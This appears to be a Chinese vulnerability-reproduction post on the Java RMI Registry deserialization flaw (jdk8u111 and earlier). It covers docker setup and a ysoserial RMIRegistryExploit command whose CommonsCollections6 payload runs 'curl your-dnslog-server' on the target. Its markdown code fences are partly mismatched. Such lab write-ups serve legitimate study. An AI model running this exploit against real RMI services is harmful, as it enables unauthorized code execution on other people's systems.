---
title: "Java RMI Registry 反序列化漏洞 (<=jdk8u111)"
date: 2026-10-22 09:18:14
categories:
  - WebSecurity
  - CVE
  - "编程语言"
  - "Java-RMI"
tags:
  - "Java-RMI"
  - "反序列化"
  - "漏洞复现"
---
## 漏洞描述

Java Remote Method Invocation 用于在 Java 中进行远程调用。RMI 存在远程 bind 的功能（虽然大多数情况不允许远程 bind），在 bind 过程中，伪造 Registry 接收到的序列化数据（实现了 Remote 接口或动态代理了实现了 Remote 接口的对象），使 Registry 在对数据进行反序列化时触发相应的利用链（环境用的是 commons-collections:3.2.1）。

## 环境搭建

执行如下命令编译及启动 RMI Registry 和服务器：

```
docker-compose build
docker-compose run -e RMIIP=your-ip -p 1099:1099 rmi
<details>
<summary>POC 代码（点击展开 · 仅供学习，请勿用于非授权测试）</summary>

<pre><code class="language-text">
其中，`your-ip` 是服务器 IP，客户端会根据这个 IP 来连接服务器。

环境启动后，RMI Registry 监听在 1099 端口。

## 漏洞复现

通过 &#121;soserial 的 exploit 包中的 RMIRegistryExploit 进行攻击

```bash
java -cp &#121;soserial-0.0.6-SNAPSHOT-all.jar &#121;soserial.exploit.RMIRegistryExploit your-ip 1099 CommonsCollections6 "curl your-dnslog-server"</code></pre>

</details>

![image-20220224142802160](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/language/images/202202241428503.png)

Registry 会返回报错，但命令会正常执行。可以看到 dnslog 成功接收请求。

![image-20220224142736669](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/language/images/202202241427738.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/language/Java-RMI-Registry-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%28%3Djdk8u111%29.md)
